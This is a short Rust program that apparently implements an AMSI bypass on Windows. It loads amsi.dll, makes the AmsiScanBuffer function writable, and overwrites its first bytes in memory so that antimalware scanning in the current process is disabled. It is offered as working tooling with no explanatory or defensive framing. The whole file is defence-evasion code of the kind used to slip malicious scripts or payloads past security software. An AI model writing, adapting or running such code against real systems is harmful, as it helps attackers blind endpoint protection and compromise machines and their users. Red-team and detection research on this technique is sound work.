use std::{ffi::CString, ptr};

use winapi::{
    shared::{
        minwindef::{DWORD, FALSE},
        ntdef::NULL,
    },
    um::{
        libloaderapi::{GetProcAddress, LoadLibraryA},
        memoryapi::{VirtualProtect, WriteProcessMemory},
        processthreadsapi::GetCurrentProcess,
        winnt::PAGE_READWRITE,
    },
};

fn main() {
    println!("[+] Patching amsi for current process");

    unsafe {
        let patch = [0x40, 0x40, 0x40, 0x40, 0x40, 0x40];
        let amsi_dll = LoadLibraryA(CString::new("amsi").unwrap().as_ptr());
        let amsi_scan_address =
            GetProcAddress(amsi_dll, CString::new("AmsiScanBuffer").unwrap().as_ptr());
        let mut old_permission: DWORD = 0;

        if VirtualProtect(
            amsi_scan_address.cast(),
            6,
            PAGE_READWRITE,
            &mut old_permission,
        ) == FALSE
        {
            panic!("[-] Failed to change protection.");
        }

        let written: *mut usize = ptr::null_mut();

        if WriteProcessMemory(
            GetCurrentProcess(),
            amsi_scan_address.cast(),
            patch.as_ptr().cast(),
            6,
            written,
        ) == FALSE
        {
            panic!("[-] Failed to overwrite function.");
        }

        VirtualProtect(
            amsi_scan_address.cast(),
            7,
            old_permission,
            &mut old_permission,
        );
        println!("[-] AmsiScanBuffer patched")
    }
}
